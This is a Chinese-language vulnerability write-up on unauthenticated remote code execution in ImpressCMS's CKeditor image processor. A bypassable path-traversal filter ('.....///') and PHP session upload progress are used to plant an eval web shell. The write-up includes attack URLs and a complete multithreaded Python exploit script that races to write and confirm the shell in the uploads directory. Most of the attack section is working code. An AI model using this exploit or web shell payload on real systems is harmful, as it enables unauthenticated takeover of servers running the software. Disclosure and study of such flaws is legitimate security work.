# impressCMS - 未经身份验证的代码执行

项目地址:https://github.com/ImpressCMS/impresscms

> impressCMS中的CKeditor图像处理器过去没有足够的过滤器用于用户提供的图像路径为攻击者提供了可能的路径遍历，导致任意文件复制/覆盖，默认的php配置用于会话上传进度，这可能导致预身份验证RCE。

## 漏洞分析
任意文件复制

htdocs/editors/CKeditor/ceditfinder/imageeditor/processImage.php

```php
> header("Content-Type: text/plain"); $imageName = str_replace(array("../", "./"), "", $_REQUEST['imageName']);
> $origName = str_replace(array("../", "./"), "", $_REQUEST['origName']);
if (empty($origName)) {
    echo "{imageFound:false}"; exit;
}
...
...
...
...
$action = $_REQUEST["action"]; $fileInfo = pathinfo($imageName); $extension = $fileInfo['extension']; switch ($action) {
    case "undo":  // This is actually revert now, as only revert is supported
        if (file_exists($origName)) {
>           unlink($imageName); copy($origName, $imageName); }
        break;
```

执行操作时，调用函数并由攻击者控制参数`undocopy()$_REQUEST['origName']$_REQUEST['imageName']`

**路径遍历**

```php
~$ php -a
Interactive mode enabled

php > var_dump(str_replace(array("../", "./"), "", '.....///'));
string(3) "../"
```

`.....///`通过过滤器后变`../`

举例:

```
http://[%CMS_HOST%]/editors/CKeditor/ceditfinder/imageeditor/processImage.php?imageName=[%SOURCE_FILE%]&origName=[%DEST_FILE%]&action=undo
```

此时利用 `cookie PHPSESSID=letspwnimpressCMS`和POST参数`PHP_SESSION_UPLOAD_PROGRESS`的多部分发布请求池，其中包含我们的payload`<?=eval($_GET[a]);exit;//`


## 创建线程触发文件复制

```
http://[%CMS_HOST%]/editors/CKeditor/ceditfinder/imageeditor/processImage.php?origName=/var/lib/php/sessions/sess_letspwnimpressCMS&imageName=.....///.....///.....///.....///uploads/aa.php&action=save
```

此时同时调用会话文件将文件复制到aa.php的上传目录，并且访问shell

```
http://[%CMS_HOST%]/uploads/aa.php?a=phpinfo();
```

最终的漏洞利用代码

```py
import sys
import string
import requests
from multiprocessing.dummy import Pool as ThreadPool
if len(sys.argv)<3:
    print('python '+sys.argv[0]+' http://localhost 1')
    print('python '+sys.argv[0]+' http://localhost 2')
    exit()
HOST = sys.argv[1]
PATH = '/editors/CKeditor/ceditfinder/imageeditor/processImage.php'
sess_name = 'letspwnimpressCMS'
headers = {
    'Connection': 'close',
    'Cookie': 'PHPSESSID=' + sess_name
}
payload = '<?=eval($_GET[a]);exit;//'
def runner1(i):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': 'A' + payload + 'A'
    }
    while 1:
        fp = open('/etc/hosts', 'rb')
        r = requests.post(HOST+PATH, files={'f': fp}, data=data, headers=headers)
        fp.close()
def runner2(i):
    filename = '/var/lib/php/sessions/sess_' + sess_name
    while 1:
        url = HOST+PATH+'?origName=.....///.....///.....///.....///uploads/aa.php&imageName=/var/lib/php/sessions/sess_letspwnimpressCMS&action=save'
        r = requests.get(url, headers=headers)
        c = r.content
        url2 = requests.get(HOST+'/uploads/aa.php?a=echo%20%2799999999999999999999999999999%27;copy(%27aa.php%27,%27bb.php%27);')
        if('99999999999999999999999999999' in url2.text):
            print('[+] done!')
            print('[!] Check '+HOST+'/uploads/bb.php?a=phpinfo();')
            exit()

if sys.argv[2] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)
```

运行:

```
python3 exp.py http://localhost/
```